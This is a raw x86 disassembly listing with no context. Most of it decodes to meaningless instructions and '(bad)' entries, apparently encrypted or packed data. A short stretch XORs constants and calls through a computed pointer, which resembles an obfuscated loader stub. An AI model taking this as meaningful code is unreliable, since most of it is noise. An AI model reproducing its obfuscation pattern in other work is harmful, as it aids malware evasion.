  40ca37:	mov    eax,0x4a119395
  40ca3c:	neg    BYTE PTR ds:0x84f8ce09
  40ca42:	test   eax,0x3b671e3a
  40ca47:	std    
  40ca48:	lea    eax,[edx-0x121f962a]
  40ca4e:	inc    edi
  40ca4f:	inc    ebp
  40ca50:	popf   
  40ca51:	inc    ebp
  40ca52:	or     edx,DWORD PTR [esi-0x19]
  40ca55:	aam    0xa0
  40ca57:	cmp    esi,DWORD PTR [edi-0x8]
  40ca5a:	rcr    BYTE PTR ds:0xac92f65d,1
  40ca60:	inc    edi
  40ca61:	adc    cl,BYTE PTR [esi-0x43dbac1]
  40ca67:	pop    es
  40ca68:	or     dh,BYTE PTR [ebx]
  40ca6a:	xchg   ebp,eax
  40ca6b:	lock adc DWORD PTR cs:[eax+0xd],ecx
  40ca70:	(bad)  
  40ca71:	(bad)  
  40ca72:	push   edi
  40ca73:	xor    eax,0x82deb262
  40ca78:	xor    BYTE PTR es:[ebx],al
  40ca7b:	outs   dx,DWORD PTR ds:[esi]
  40ca7c:	ins    DWORD PTR es:[edi],dx
  40ca7d:	(bad)  
  40ca7e:	arpl   bp,di
  40ca80:	xor    al,0x66
  40ca82:	lods   al,BYTE PTR ds:[esi]
  40ca83:	ror    DWORD PTR [edi+0xd17727b],cl
  40ca89:	mov    ?,WORD PTR [edx+edi*4]
  40ca8c:	rcr    dh,1
  40ca8e:	lea    eax,[esi+0x6c8617fe]
  40ca94:	adc    dh,bh
  40ca96:	jno    0x40ca4d
  40ca98:	aam    0x43
  40ca9a:	mov    ds:0x591851f5,eax
  40ca9f:	rcl    ecx,0x60
  40caa2:	xchg   ebx,eax
  40caa3:	mov    bl,0xb5
  40caa5:	mov    ebx,0x254ff962
  40caaa:	mov    ds:0x63896d34,al
  40caaf:	xor    dh,BYTE PTR [ecx-0x53]
  40cab2:	arpl   WORD PTR [edi],di
  40cab4:	jns    0x40cb0b
  40cab6:	inc    esp
  40cab7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cab8:	xchg   esi,eax
  40cab9:	or     ecx,ecx
  40cabb:	add    BYTE PTR [eax],bh
  40cabd:	adc    BYTE PTR [ebp+0x3de7749f],bh
  40cac3:	sbb    eax,0xcb3debb9
  40cac8:	mov    cl,0xe9
  40caca:	push   ss
  40cacb:	push   esp
  40cacc:	and    al,0x71
  40cace:	and    dl,BYTE PTR [esi-0x52]
  40cad1:	xchg   BYTE PTR [ebp-0x70],cl
  40cad4:	ret    0x25b2
  40cad7:	ds dec edi
  40cad9:	sub    al,0x1a
  40cadb:	bound  eax,QWORD PTR [edi+0x63826daf]
  40cae1:	out    dx,al
  40cae2:	lock cld 
  40cae4:	stos   BYTE PTR es:[edi],al
  40cae5:	jp     0x40cb1d
  40cae7:	pop    ds
  40cae8:	loop   0x40cab6
  40caea:	test   eax,0xdae7d3a0
  40caef:	jae    0x40caf4
  40caf1:	pop    ecx
  40caf2:	sbb    ch,BYTE PTR ds:0xb109d44f
  40caf8:	xchg   ecx,eax
  40caf9:	repz pop ds
  40cafb:	sub    al,0xc2
  40cafd:	aas    
  40cafe:	test   BYTE PTR [esi],al
  40cb00:	dec    ecx
  40cb01:	sti    
  40cb02:	popf   
  40cb03:	add    esp,DWORD PTR [edx]
  40cb05:	sbb    eax,0xb255c875
  40cb0a:	stos   DWORD PTR es:[edi],eax
  40cb0b:	xor    al,0x27
  40cb0d:	xor    BYTE PTR [eax+esi*2-0x33],bl
  40cb11:	(bad)  
  40cb14:	test   DWORD PTR [edi+edx*1+0x6],edi
  40cb18:	lock inc ecx
  40cb1a:	ror    dh,cl
  40cb1c:	sbb    dl,0xa3
  40cb1f:	mov    BYTE PTR [ebx+0x3321519],0xaf
  40cb26:	cmp    DWORD PTR [ebx-0x27],eax
  40cb29:	pop    ss
  40cb2a:	sbb    BYTE PTR [esi-0x6c7f1689],ch
  40cb30:	mov    eax,0x885dbb7c
  40cb35:	test   al,0x81
  40cb37:	sbb    ecx,edx
  40cb39:	pop    ss
  40cb3a:	(bad)  
  40cb3c:	lahf   
  40cb3d:	es push cs
  40cb3f:	mov    ebp,0x3fe4929f
  40cb44:	es ins DWORD PTR es:[edi],dx
  40cb46:	lods   al,BYTE PTR ds:[esi]
  40cb47:	inc    eax
  40cb48:	cld    
  40cb49:	fsub   DWORD PTR ds:0x16d8d9b6
  40cb4f:	add    bl,BYTE PTR [ebp+ebp*2+0x599268d4]
  40cb56:	mov    bl,0xed
  40cb58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cb59:	inc    ebp
  40cb5a:	rcr    DWORD PTR [ecx+0x51a397e3],cl
  40cb60:	(bad)  
  40cb61:	or     eax,0xe98e27d
  40cb66:	xchg   edx,eax
  40cb67:	int    0xd3
  40cb69:	xchg   esi,eax
  40cb6a:	int    0x62
  40cb6c:	clc    
  40cb6d:	push   ebp
  40cb6e:	outs   dx,DWORD PTR ds:[esi]
  40cb6f:	bound  ebx,QWORD PTR [ecx]
  40cb71:	jg     0x40cb49
  40cb73:	ret    
  40cb74:	sti    
  40cb75:	mov    bh,0x13
  40cb77:	cmp    al,bh
  40cb79:	push   0x8c36158e
  40cb7e:	mov    ch,0x97
  40cb80:	pop    es
  40cb81:	das    
  40cb82:	sti    
  40cb83:	in     eax,0xfb
  40cb85:	xor    esi,DWORD PTR [esi-0x7]
  40cb88:	in     al,0x95
  40cb8a:	and    eax,0xc4fec35f
  40cb8f:	dec    esi
  40cb90:	xchg   esp,eax
  40cb91:	push   eax
  40cb92:	or     al,0x5a
  40cb94:	pop    eax
  40cb95:	outs   dx,BYTE PTR ds:[esi]
  40cb96:	add    eax,esi
  40cb98:	imul   eax,DWORD PTR [edx]
  40cb9b:	mov    edx,DWORD PTR [ebp-0x4]
  40cb9e:	xor    edx,ecx
  40cba0:	mov    ecx,DWORD PTR [ebp+0x8]
  40cba3:	lea    ecx,[edx+ecx*1+0x32729b]
  40cbaa:	cmp    ecx,eax
  40cbac:	jne    0x40c41f
  40cbb2:	mov    ebx,esi
  40cbb4:	jmp    0x40cbbe
  40cbb9:	mov    ebx,0x32729b
  40cbbe:	mov    eax,DWORD PTR [ebp-0x4]
  40cbc1:	xor    eax,0x7510854
  40cbc6:	add    eax,ebx
  40cbc8:	mov    DWORD PTR [ebp-0xc],eax
  40cbcb:	xor    ebx,ebx
  40cbcd:	lea    eax,[ebp-0x10]
  40cbd0:	add    ebx,DWORD PTR [eax]
  40cbd2:	call   ebx
  40cbd4:	xor    ebx,ebx
  40cbd6:	inc    ebx
  40cbd7:	cmp    DWORD PTR [ebp+0x10],ebx
  40cbda:	je     0x40d321
  40cbe0:	xchg   edx,eax
  40cbe1:	push   0xa
  40cbe3:	pop    ecx
  40cbe4:	push   0x4
  40cbe6:	pop    ebx
  40cbe7:	inc    ebx
  40cbe8:	xchg   ebx,ecx
  40cbea:	jmp    0x40ce4d
  40cbef:	imul   edx,DWORD PTR [edi-0x4b0ecbf3],0x73
  40cbf6:	push   ecx
  40cbf7:	int3   
  40cbf8:	xor    esp,DWORD PTR [esi+edi*8-0x2a]
  40cbfc:	mov    ah,0xa0
  40cbfe:	dec    ecx
  40cbff:	bound  ecx,QWORD PTR [esi+edi*2+0x7e7c387e]
  40cc06:	jle    0x40cbaf
  40cc08:	es into 
  40cc0a:	popf   
  40cc0b:	mov    eax,ds:0xd858f579
  40cc10:	aas    
  40cc11:	mov    al,0xf3
  40cc13:	int    0x29
  40cc15:	fs mov bl,0x53
  40cc18:	call   0xb9c:0x20ae80a0
  40cc1f:	mov    ah,0x66
  40cc21:	inc    ecx
  40cc22:	js     0x40cba8
  40cc24:	sub    DWORD PTR [esi-0x54],ebx
  40cc27:	es inc eax
  40cc29:	mov    al,0xef
  40cc2b:	dec    ebp
  40cc2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cc2d:	jecxz  0x40cc60
  40cc2f:	lea    edi,[esp+ebx*2]
  40cc32:	cli    
  40cc33:	fadd   QWORD PTR [ebx-0x5564ea58]
  40cc39:	sbb    BYTE PTR [ecx],ah
  40cc3b:	dec    ecx
  40cc3c:	in     eax,0xcc
  40cc3e:	sti    
  40cc3f:	sub    ebx,DWORD PTR [ecx+0x77758a7c]
  40cc45:	inc    esi
  40cc46:	popa   
  40cc47:	sti    
  40cc48:	enter  0x71d3,0xfc
  40cc4c:	push   0x3b
  40cc4e:	add    BYTE PTR [ecx+0x8],0x49
  40cc52:	sub    eax,DWORD PTR [edi]
  40cc54:	mov    ch,0xcd
  40cc56:	cmp    eax,0xa4760527
  40cc5b:	test   BYTE PTR [ebx+0x759a3921],bl
  40cc61:	mov    bh,0xf9
  40cc63:	cmp    dh,BYTE PTR [ebx+0x22f02df1]
  40cc69:	outs   dx,DWORD PTR ds:[esi]
  40cc6a:	mov    WORD PTR [edi],ds
  40cc6c:	aas    
  40cc6d:	inc    edx
  40cc6e:	test   DWORD PTR ds:0xa0409a8b,esp
  40cc74:	dec    esp
  40cc75:	push   ebx
  40cc76:	inc    edi
  40cc77:	repnz in al,0x21
  40cc7a:	daa    
  40cc7b:	mov    ecx,0x611c4ddc
  40cc80:	and    eax,0xa5fcb17a
  40cc85:	cmp    bl,BYTE PTR [edx-0x6a794fc6]
  40cc8b:	and    al,0xeb
  40cc8d:	dec    esp
  40cc8e:	xor    edi,DWORD PTR [ebp+0x1b]
  40cc91:	(bad)  [edx]
  40cc93:	test   DWORD PTR [eax],esp
  40cc95:	push   esp
  40cc96:	and    al,BYTE PTR [edx+0x37]
  40cc99:	sbb    ch,BYTE PTR [ebp-0x59054000]
  40cc9f:	je     0x40cd1d
  40cca1:	neg    eax
  40cca3:	cmp    DWORD PTR [edi],0xabb401d2
  40cca9:	out    dx,eax
  40ccaa:	fucom  st(1)
  40ccac:	je     0x40cc36
  40ccae:	inc    eax
  40ccaf:	in     eax,0xce
  40ccb1:	scas   eax,DWORD PTR es:[edi]
  40ccb2:	sub    bl,bl
  40ccb4:	cwde   
  40ccb5:	mov    bh,0x6d
  40ccb7:	pop    ds
  40ccb8:	dec    ebp
  40ccb9:	test   al,0x3e
  40ccbb:	mov    ds:0xe29ea9bd,eax
  40ccc0:	icebp  
  40ccc1:	adc    DWORD PTR [eax],esi
  40ccc3:	add    eax,0xc74b823c
  40ccc8:	inc    ebx
  40ccc9:	mov    ecx,0x47a2c764
  40ccce:	dec    edi
  40cccf:	jmp    0x40cd1d
  40ccd1:	and    ebp,ebp
  40ccd3:	mov    ds:0x118ebd80,eax
  40ccd8:	jno    0x40ccfd
  40ccda:	ins    DWORD PTR es:[edi],dx
  40ccdb:	in     eax,0x5d
  40ccdd:	pop    ds
  40ccde:	jns    0x40cd22
  40cce0:	dec    esi
  40cce1:	pop    esi
  40cce2:	ret    
  40cce3:	in     al,0x5e
  40cce5:	jno    0x40cd5c
  40cce7:	outs   dx,DWORD PTR ds:[esi]
  40cce8:	push   0x38
  40ccea:	leave  
  40cceb:	les    ecx,FWORD PTR [ecx]
  40cced:	add    bl,bl
  40ccef:	and    edi,DWORD PTR [eax-0x3d312199]
  40ccf5:	xchg   esp,eax
  40ccf6:	(bad)  
  40ccf7:	and    eax,0x1a1d2819
  40ccfc:	call   0x97d0edc6
  40cd01:	bound  edi,QWORD PTR [ecx]
  40cd03:	dec    ecx
  40cd04:	ins    BYTE PTR es:[edi],dx
  40cd05:	push   es
  40cd06:	lods   eax,DWORD PTR ds:[esi]
  40cd07:	xchg   ebx,eax
  40cd08:	mov    BYTE PTR [edi+0x2bb4b4],ch
  40cd0e:	sbb    DWORD PTR [ecx+0x37],edi
  40cd11:	or     bl,0x75
  40cd14:	imul   eax,DWORD PTR [eax+0x44ae2dd],0x77
  40cd1b:	sbb    edx,esp
  40cd1d:	add    DWORD PTR [edi+0x59bd567f],esi
  40cd23:	in     al,0x28
  40cd25:	jns    0x40cd06
  40cd27:	popf   
  40cd28:	lock xlat BYTE PTR ds:[ebx]
  40cd2a:	inc    esi
  40cd2b:	sub    edi,DWORD PTR [esi+ebx*1-0x5f1a83ca]
  40cd32:	mov    ah,0x4b
  40cd34:	mov    ebx,esp
  40cd36:	lods   al,BYTE PTR ds:[esi]
  40cd37:	daa    
  40cd38:	add    eax,0x151f75b8
  40cd3d:	mov    ds:0x59361d5b,al
  40cd42:	mov    ebx,edi
  40cd44:	stos   BYTE PTR es:[edi],al
  40cd45:	jl     0x40cd02
  40cd47:	adc    al,0x5
  40cd49:	jge    0x40ccf9
  40cd4b:	jb     0x40cd78
  40cd4d:	(bad)  
  40cd4e:	lahf   
  40cd4f:	mov    al,ds:0xf02dfaa8
  40cd54:	pop    ecx
  40cd55:	pusha  
  40cd56:	lods   eax,DWORD PTR ds:[esi]
  40cd57:	scas   al,BYTE PTR es:[edi]
  40cd58:	int3   
  40cd59:	in     al,0x14
  40cd5b:	inc    eax
  40cd5c:	fisub  DWORD PTR [ebp-0x31]
  40cd5f:	icebp  
  40cd60:	inc    ecx
  40cd61:	mov    ebx,0x295c49db
  40cd66:	jmp    0x40cdb8
  40cd68:	or     DWORD PTR [edx+0x4dca2ef3],esi
  40cd6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cd6f:	std    
  40cd70:	ja     0x40cddc
  40cd72:	jl     0x40cd90
  40cd74:	sbb    BYTE PTR [esi+0x3ec1966f],dh
  40cd7a:	arpl   WORD PTR [eax],si
  40cd7c:	mov    ds:0xe3d3d92f,eax
  40cd81:	retf   
  40cd82:	fdivp  st(1),st
  40cd84:	inc    al
  40cd86:	lahf   
  40cd87:	xchg   edi,eax
  40cd88:	adc    al,0x76
  40cd8a:	lahf   
  40cd8b:	sub    eax,0x9d0126ef
  40cd90:	mov    ds:0xf267204b,eax
  40cd95:	call   0x1c28:0xb62a77e7
  40cd9c:	inc    edx
  40cd9d:	dec    ebx
  40cd9e:	addr16 dec edi
  40cda0:	sbb    DWORD PTR [eax+0x1a],edx
  40cda3:	pause  
  40cda5:	hlt    
  40cda6:	(bad)  
  40cda7:	sar    DWORD PTR [edi],1
  40cda9:	sbb    esp,DWORD PTR [edx]
  40cdab:	xchg   esp,eax
  40cdac:	push   edx
  40cdad:	inc    ecx
  40cdae:	xchg   ebx,eax
  40cdaf:	psadbw mm4,mm3
  40cdb2:	push   0xffffff8f
  40cdb4:	sub    DWORD PTR es:[eax-0x3f2e45a],0xffffffff
  40cdbc:	cmp    ecx,DWORD PTR [ecx]
  40cdbe:	fidivr WORD PTR [ecx]
  40cdc0:	idiv   BYTE PTR fs:[ecx+0x4c]
  40cdc4:	inc    esi
  40cdc5:	jmp    0x40cd64
  40cdc7:	and    cl,bh
  40cdc9:	sub    al,0x5f
  40cdcb:	pusha  
  40cdcc:	les    edx,FWORD PTR [edx]
  40cdce:	fisub  DWORD PTR [edi+0x6b]
  40cdd1:	jmp    0xf057f94a
  40cdd6:	loopne 0x40cde0
  40cdd8:	mov    bh,0xde
  40cdda:	xchg   esi,eax
  40cddb:	mov    cl,0x56
  40cddd:	(bad)  
  40cdde:	mov    esi,0xc74bb3de
  40cde3:	or     eax,DWORD PTR ds:[edx-0x4caaa575]
  40cdea:	out    0x8c,al
  40cdec:	cs xor eax,0xef6a4f57
  40cdf2:	js     0x40ce46
  40cdf4:	ror    BYTE PTR [eax+0x37],1
  40cdf7:	or     DWORD PTR [ecx-0x7f],esi
  40cdfa:	sar    edi,cl
  40cdfc:	adc    cl,ah
  40cdfe:	(bad)  
  40cdff:	shl    esp,0x9d
  40ce02:	lea    ebx,[ebx+0x11d187b4]
  40ce08:	ret    0x8dc1
  40ce0b:	out    0xae,eax
  40ce0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ce0e:	xor    BYTE PTR [esp+eax*4],0x8
  40ce12:	scas   al,BYTE PTR es:[edi]
  40ce13:	(bad)  
  40ce15:	(bad)  
  40ce16:	xchg   ebx,eax
  40ce17:	mov    eax,0x49ea5896
  40ce1c:	lea    ebp,ds:0x89e69d80
  40ce22:	cmp    DWORD PTR cs:0xdf535a68,esp
  40ce29:	jne    0x40ce9d
  40ce2b:	pop    esp
  40ce2c:	lods   eax,DWORD PTR ds:[esi]
  40ce2d:	int    0x5d
  40ce2f:	xor    edx,esp
  40ce31:	mov    cl,0x3d
  40ce33:	jno    0x40ce50
  40ce35:	cdq    
  40ce36:	aas    
  40ce37:	cmp    DWORD PTR [ecx+0x59],edx
  40ce3a:	push   edi
  40ce3b:	das    
  40ce3c:	cdq    
  40ce3d:	xacquire xchg DWORD PTR [eax+0x29d3a47d],eax
  40ce44:	mov    cl,BYTE PTR [eax+edx*1+0x2b]
  40ce48:	dec    esp
  40ce49:	pushf  
  40ce4a:	sbb    al,0xfe
  40ce4c:	xchg   esi,eax
  40ce4d:	sub    ebx,ecx
  40ce4f:	xchg   ebx,ecx
  40ce51:	jmp    0x40d0b4
  40ce56:	push   ebx
  40ce57:	std    
  40ce58:	dec    ebx
  40ce59:	sahf   
  40ce5a:	push   ecx
  40ce5b:	push   0x84027173
  40ce60:	add    al,0xed
  40ce62:	cmp    al,0x98
  40ce64:	push   ebp
  40ce65:	cmp    al,0x2c
  40ce67:	mov    edi,DWORD PTR [esi+0x7e]
  40ce6a:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40ce6e:	pop    ebx
  40ce6f:	dec    ecx
  40ce70:	loopne 0x40cea1
  40ce72:	cmp    DWORD PTR [eax],ebx
  40ce74:	xor    ah,ah
  40ce76:	ror    BYTE PTR ds:0xdbc23b5b,0x12
  40ce7d:	retf   0xde9c
  40ce80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ce81:	mov    ds:0xd7d30626,al
  40ce86:	cmc    
  40ce87:	mov    al,ds:0xf9837ace
  40ce8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ce8d:	and    BYTE PTR [esi-0x20],ch
  40ce90:	push   ecx
  40ce91:	mov    ch,0xbf
  40ce93:	rol    cl,0xd4
  40ce96:	push   esp
  40ce97:	div    BYTE PTR [edi+0x33]
  40ce9a:	mov    ebp,DWORD PTR [edx]
  40ce9c:	mov    al,0x44
  40ce9e:	lock ficomp WORD PTR [ecx-0x1d]
  40cea2:	aam    0xb9
  40cea4:	add    esi,DWORD PTR [esi+eiz*8+0x68]
  40cea8:	or     eax,0x35437e66
  40cead:	das    
  40ceae:	call   0x6628:0xab09963b
  40ceb5:	sub    al,0x9b
  40ceb7:	pushf  
  40ceb8:	imul   DWORD PTR [edi+0x35]
  40cebb:	retf   0xdbbe
  40cebe:	loope  0x40cf2e
  40cec0:	(bad)  
  40cec1:	xchg   esp,eax
  40cec2:	adc    dh,BYTE PTR [bp+di-0x1bd2]
  40cec7:	pop    ecx
  40cec8:	(bad)  
  40cecb:	or     eax,0x8b2a7dfb
  40ced0:	int3   
  40ced1:	sub    cl,BYTE PTR [eax-0x4ff488a3]
  40ced7:	cli    
  40ced8:	adc    eax,DWORD PTR [ebx-0xc]
  40cedb:	leave  
  40cedc:	test   al,0x66
  40cede:	enter  0x858d,0xb
  40cee2:	lea    ebp,[edi-0x582c5004]
  40cee8:	and    eax,0x791ccd7
  40ceed:	ss shr esp,0x9b
  40cef1:	mov    ebx,0x7c9e0b60
  40cef6:	sbb    DWORD PTR [edi-0x4],0x637e3d47
  40cefd:	jge    0x40cf43
  40ceff:	(bad)  
  40cf01:	cmp    ch,BYTE PTR [edi+ebp*2-0x720f7903]
  40cf08:	and    cl,BYTE PTR [edx+ebp*8-0x2d1e6026]
  40cf0f:	mov    DWORD PTR ds:0x6d75d061,esp
  40cf15:	fcom   QWORD PTR [ebp+0x1f]
  40cf18:	(bad)  
  40cf19:	mov    ecx,0x9b055648
  40cf1e:	dec    ecx
  40cf1f:	adc    al,0x14
  40cf21:	imul   edi,DWORD PTR [esp+ecx*2],0xaf236cee
  40cf28:	or     eax,0x220fc176
  40cf2d:	inc    ebp
  40cf2e:	iret   
  40cf2f:	adc    eax,0x39deb4b7
  40cf34:	test   al,0x95
  40cf36:	jne    0x40cf6e
  40cf38:	sub    DWORD PTR [edx],esp
  40cf3a:	push   ebp
  40cf3b:	pop    edi
  40cf3c:	cmp    BYTE PTR [ebp+0x4a47f25],cl
  40cf42:	fst    QWORD PTR [esi-0xb0165d5]
  40cf48:	mov    es,WORD PTR [eax]
  40cf4a:	cmp    ecx,DWORD PTR ds:0x8df21b6a
  40cf50:	xor    BYTE PTR [edi-0x6bcb467b],ah
  40cf56:	jecxz  0x40cfaa
  40cf58:	sub    ebx,DWORD PTR [ebp+0x3]
  40cf5b:	mov    fs:0x1d12028c,al
  40cf61:	cmc    
  40cf62:	out    dx,eax
  40cf63:	sub    edx,ebp
  40cf65:	fadd   QWORD PTR [ebp+0x4e6e5da1]
  40cf6b:	pop    ss
  40cf6c:	sar    BYTE PTR [ebp+0xed19f3c],1
  40cf72:	sub    ah,bl
  40cf74:	fwait
  40cf75:	cwde   
  40cf76:	xor    DWORD PTR [edi+0x4272eba8],esp
  40cf7c:	outs   dx,DWORD PTR ds:[si]
  40cf7e:	xor    esi,DWORD PTR [ecx]
  40cf80:	and    al,0xaa
  40cf82:	sbb    al,0xe6
  40cf84:	cmp    esi,DWORD PTR [edx]
  40cf86:	push   0xfb4f4ce
  40cf8b:	retf   
  40cf8c:	pop    edx
  40cf8d:	and    BYTE PTR [edi],al
  40cf8f:	xchg   BYTE PTR [ecx-0x3742b9f2],al
  40cf95:	loopne 0x40cff6
  40cf97:	xlat   BYTE PTR ds:[ebx]
  40cf98:	mov    eax,ds:0xef85f784
  40cf9d:	iret   
  40cf9e:	sbb    eax,0x72fd1e72
  40cfa3:	xchg   BYTE PTR [eax+0x18],bl
  40cfa6:	jmp    0x8167:0xbdb12589
  40cfad:	pop    ecx
  40cfae:	jge    0x40cfaa
  40cfb0:	dec    ebp
  40cfb1:	push   cs
  40cfb2:	icebp  
  40cfb3:	iret   
  40cfb4:	icebp  
  40cfb5:	fdiv   DWORD PTR [esi+0x7ca8ef94]
  40cfbb:	test   edx,ecx
  40cfbd:	imul   esp,DWORD PTR [eax-0x2358db5b],0x41
  40cfc4:	or     ecx,eax
  40cfc6:	xchg   BYTE PTR [eax],bh
  40cfc8:	push   ss
  40cfc9:	mov    ebp,0x2fa8024c
  40cfce:	(bad)  
  40cfcf:	call   0xdb0a:0x62d10194
  40cfd6:	cmp    ch,BYTE PTR [eax]
  40cfd8:	mov    ch,0xea
  40cfda:	out    0x27,al
  40cfdc:	(bad)  
  40cfdd:	repnz push ecx
  40cfdf:	jno    0x40cf76
  40cfe1:	adc    dh,cl
  40cfe3:	and    BYTE PTR [edi+0x6a],ch
  40cfe6:	arpl   bx,di
  40cfe8:	push   edi
  40cfe9:	addr16 cli 
  40cfeb:	jo     0x40d00d
  40cfed:	mov    esp,0x9df2d107
  40cff2:	dec    ebp
  40cff3:	std    
  40cff4:	sti    
  40cff5:	push   ebp
  40cff6:	aad    0x91
  40cff8:	ja     0x40cfa3
  40cffa:	push   ss
  40cffb:	(bad)  
  40cffc:	std    
  40cffd:	push   edi
  40cffe:	pop    ebx
  40cfff:	lds    ebx,FWORD PTR [ebx]
  40d001:	in     al,0x2b
  40d003:	sub    DWORD PTR [edi+edx*4],edx
  40d006:	shr    BYTE PTR [edx-0x24],cl
  40d009:	mov    ebx,0xc332dd35
  40d00e:	adc    BYTE PTR [ecx-0x2d],dl
  40d011:	loope  0x40cfbd
  40d013:	mov    edx,ds
  40d015:	clc    
  40d016:	dec    eax
  40d017:	or     edi,0x17
  40d01a:	pop    ss
  40d01b:	push   ecx
  40d01c:	mov    esi,0xf086229a
  40d021:	fdivr  st(5),st
  40d023:	out    0xc7,al
  40d025:	fldcw  WORD PTR [ebx+0x78]
  40d028:	sub    DWORD PTR [ebx+0x7d],ecx
  40d02b:	xor    al,0x31
  40d02d:	xlat   BYTE PTR ds:[ebx]
  40d02e:	adc    eax,eax
  40d030:	out    dx,al
  40d031:	adc    ebx,DWORD PTR [edi+0x26]
  40d034:	scas   eax,DWORD PTR es:[edi]
  40d035:	inc    esi
  40d036:	mov    ecx,0x32234957
  40d03b:	sbb    DWORD PTR [ebx+0x50],ebp
  40d03e:	cmp    DWORD PTR [eax+esi*2],esi
  40d041:	xor    al,al
  40d043:	adc    esp,DWORD PTR [edi-0x579159c4]
  40d049:	jae    0x40d0b5
  40d04b:	iret   
  40d04c:	ins    BYTE PTR es:[edi],dx
  40d04d:	sub    edx,edi
  40d04f:	mov    al,ds:0xad16a6c2
  40d054:	lods   al,BYTE PTR ds:[esi]
  40d055:	data16 ficomp WORD PTR [ecx-0x38707d43]
  40d05c:	xor    dl,BYTE PTR [esi]
  40d05e:	jecxz  0x40d007
  40d060:	cmp    BYTE PTR [ecx],bl
  40d062:	pop    esp
  40d063:	mov    ds:0x6abb06a9,eax
  40d068:	jne    0x40d096
  40d06a:	in     al,0x55
  40d06c:	dec    ebp
  40d06d:	add    eax,0xaaf03728
  40d072:	(bad)  
  40d073:	cmp    ah,BYTE PTR [eax]
  40d075:	or     dl,ch
  40d077:	mov    bl,0xc0
  40d079:	inc    DWORD PTR [edx-0x33dfcc47]
  40d07f:	xor    dl,ah
  40d081:	es inc edx
  40d083:	or     BYTE PTR [esi+0x6caf5a92],dh
  40d089:	and    DWORD PTR [esi],0x13
  40d08c:	adc    ecx,DWORD PTR [edx-0x1df82d9d]
  40d092:	lock mov edi,0x993e6a36
  40d098:	test   BYTE PTR [edx-0x55],dl
  40d09b:	push   ecx
  40d09c:	cli    
  40d09d:	or     BYTE PTR cs:[edx],ah
  40d0a0:	xor    ah,BYTE PTR [edi+ecx*8+0x7e]
  40d0a4:	fadd   st(4),st
  40d0a6:	imul   edx,DWORD PTR [edi],0xffffffd8
  40d0a9:	sub    BYTE PTR [ebp-0x44],cl
  40d0ac:	call   0x66ba11f9
  40d0b1:	cmp    eax,0xffffff90
  40d0b4:	dec    ecx
  40d0b5:	mov    eax,DWORD PTR [ebp-0x1c]
  40d0b8:	imul   eax,ecx
  40d0bb:	add    esp,eax
  40d0bd:	xchg   edx,eax
  40d0be:	jmp    0x40d321
  40d0c3:	sahf   
  40d0c4:	test   BYTE PTR [edi],0xc3
  40d0c7:	push   edi
  40d0c8:	repz pop edx
  40d0ca:	jae    0x40d0bf
  40d0cc:	ficom  WORD PTR [edx+0x6a]
  40d0cf:	inc    edi
  40d0d0:	das    
  40d0d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d0d3:	test   BYTE PTR [ecx+0x7c387e7e],0x7e
  40d0da:	jle    0x40d0af
  40d0dc:	push   ebp
  40d0dd:	mov    cl,0x24
  40d0df:	mov    ah,BYTE PTR [esi+0x7646512]
  40d0e5:	(bad)
  40d0e9:	push   0xffffffb3
  40d0eb:	xlat   BYTE PTR ds:[ebx]
  40d0ec:	test   BYTE PTR [eax+edx*8-0x28647d21],al
  40d0f3:	sbb    cl,al
  40d0f5:	cli    
  40d0f6:	neg    DWORD PTR [edx+0x65493bdb]
  40d0fc:	ins    BYTE PTR es:[edi],dx
  40d0fd:	and    esp,edi
  40d0ff:	jbe    0x40d112
  40d101:	jb     0x40d088
  40d103:	mov    eax,0xd0f2de39
  40d108:	les    esp,FWORD PTR [ebp-0x34de13c8]
  40d10e:	adc    eax,0x65463202
  40d113:	add    ebx,DWORD PTR [ebx+0x17]
  40d116:	mov    BYTE PTR [edi-0x7d9ae05b],al
  40d11c:	push   esp
  40d11d:	(bad)  
  40d11e:	mov    ds:0x5e0fef2,al
  40d123:	out    0xd7,al
  40d125:	mov    bh,0x86
  40d127:	adc    BYTE PTR [esi+0x490d0eb8],dh
  40d12d:	xchg   esp,eax
  40d12e:	daa    
  40d12f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d130:	call   0x1f21:0xd30ca952
  40d137:	push   esi
  40d138:	mov    cl,0x90
  40d13a:	sbb    ch,BYTE PTR ds:0xafe27657
  40d140:	jl     0x40d10e
  40d142:	arpl   si,ax
  40d144:	mov    al,0x35
  40d146:	sbb    al,BYTE PTR [eax+0x7b]
  40d149:	popa   
  40d14a:	fnsave [edx+0x4c]
  40d14d:	(bad)  
  40d14e:	sub    BYTE PTR [ecx-0x65690b12],dh
  40d154:	mov    cl,0xf7
  40d156:	add    al,0x68
  40d158:	sbb    dh,ah
  40d15a:	mov    bh,0xfb
  40d15c:	rcr    BYTE PTR [ebp+0x39],1
  40d15f:	(bad)  
  40d160:	pop    edx
  40d161:	and    ecx,eax
  40d163:	pop    esp
  40d164:	je     0x40d1b0
  40d166:	add    BYTE PTR [esi+0x75],ch
  40d169:	fwait
  40d16a:	sub    bh,BYTE PTR [edi+0x42]
  40d16d:	xchg   ecx,eax
  40d16e:	ins    DWORD PTR es:[edi],dx
  40d16f:	ror    DWORD PTR [eax-0x5e],0xe8
  40d173:	pop    edi
  40d174:	mov    dl,0x32
  40d176:	cmp    eax,0x258ec31a
  40d17b:	addr16 cmp al,0x28
  40d17e:	ss mov edx,0x8a751b38
  40d184:	cmp    edx,DWORD PTR [ecx+edi*2-0x13]
  40d188:	pushf  
  40d189:	dec    esi
  40d18a:	jbe    0x40d1d0
  40d18c:	sub    BYTE PTR [ebx],cl
  40d18e:	jne    0x40d1d4
  40d190:	add    esi,DWORD PTR [ebx]
  40d192:	push   ebp
  40d193:	adc    eax,0xab5fdfa1
  40d198:	adc    ah,BYTE PTR [edi]
  40d19a:	xor    BYTE PTR [ebp-0x78],al
  40d19d:	popf   
  40d19e:	jmp    FWORD PTR [edi+0x73997281]
  40d1a4:	stc    
  40d1a5:	es stc 
  40d1a7:	jl     0x40d1bc
  40d1a9:	ins    BYTE PTR es:[edi],dx
  40d1aa:	push   ss
  40d1ab:	out    dx,eax
